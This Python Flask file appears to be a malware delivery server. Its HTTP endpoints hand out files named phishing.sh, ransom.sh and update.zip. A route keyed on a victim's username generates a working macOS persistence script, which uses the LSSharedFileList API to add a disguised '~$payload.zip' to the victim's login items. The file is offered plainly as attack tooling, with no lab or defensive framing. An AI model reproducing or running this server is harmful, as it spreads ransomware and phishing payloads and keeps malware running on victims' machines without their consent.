import argparse
from flask import Flask, send_file
from flask_restful import Resource, Api


app = Flask(__name__)
api = Api(app)


HTTP_PORT = 8080
HOST = '0.0.0.0'

class getPhishing(Resource):
    def get(self):
        return send_file('.\\Assets\\phishing.sh')


class getRansomware(Resource):
    def get(self):
        return send_file('.\\Assets\\ransom.sh')


class getUpdate(Resource):
    def get(self):
        return send_file('.\\Assets\\update.zip')

#/Users/robertbebert/Library
class getCraftedPayload(Resource):
    def get(self, path):
        with open('.\\Assets\\persist.py', 'w') as persist:
            persist.write(
                f"""from CoreFoundation import kCFURLPOSIXPathStyle\nfrom CoreFoundation import CFURLCreateWithFileSystemPath\nfrom CoreFoundation import kCFAllocatorDefault\nfrom Foundation import NSBundle\nfrom objc import loadBundleFunctions\nfrom objc import loadBundleFunctions\nfrom Foundation import NSBundle\nfrom LaunchServices import kLSSharedFileListSessionLoginItems\n\n# File or app to be added in the login items list\nPATH = "/Users/{path}/Library/~$payload.zip"\n\nshared_file_list = NSBundle.bundleWithIdentifier_(\n    'com.apple.coreservices.SharedFileList')\nf = [\n    ('LSSharedFileListCreate',\n     b'^{{OpaqueLSSharedFileListRef=}}^{{__CFAllocator=}}^{{__CFString=}}@'),\n    ('LSSharedFileListCopySnapshot',\n     b'^{{__CFArray=}}^{{OpaqueLSSharedFileListRef=}}o^I'),\n    ('LSSharedFileListInsertItemURL',\n     b'^{{OpaqueLSSharedFileListItemRef=}}^{{OpaqueLSSharedFileListRef=}}^{{OpaqueLSSharedFileListItemRef=}}^{{__CFString=}}^{{OpaqueIconRef=}}^{{__CFURL=}}^{{__CFDictionary=}}^{{__CFArray=}}'),\n    ('kLSSharedFileListItemBeforeFirst', b'^{{OpaqueLSSharedFileListItemRef=}}')\n]\nloadBundleFunctions(shared_file_list, globals(), f)\nappURL = CFURLCreateWithFileSystemPath(None, PATH, kCFURLPOSIXPathStyle, False)\nitems = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListSessionLoginItems, None)\nLSSharedFileListInsertItemURL(items, kLSSharedFileListItemBeforeFirst, None, None, appURL, None, None)\n""")
        return send_file('.\\Assets\\persist.py')


api.add_resource(getUpdate, '/update')
api.add_resource(getRansomware,'/ransom')
api.add_resource(getPhishing,'/phishing')
api.add_resource(getCraftedPayload, '/<path>')


def startHTTPServer():
    app.run(port=HTTP_PORT, host=HOST)


if __name__ == '__main__':
    startHTTPServer()
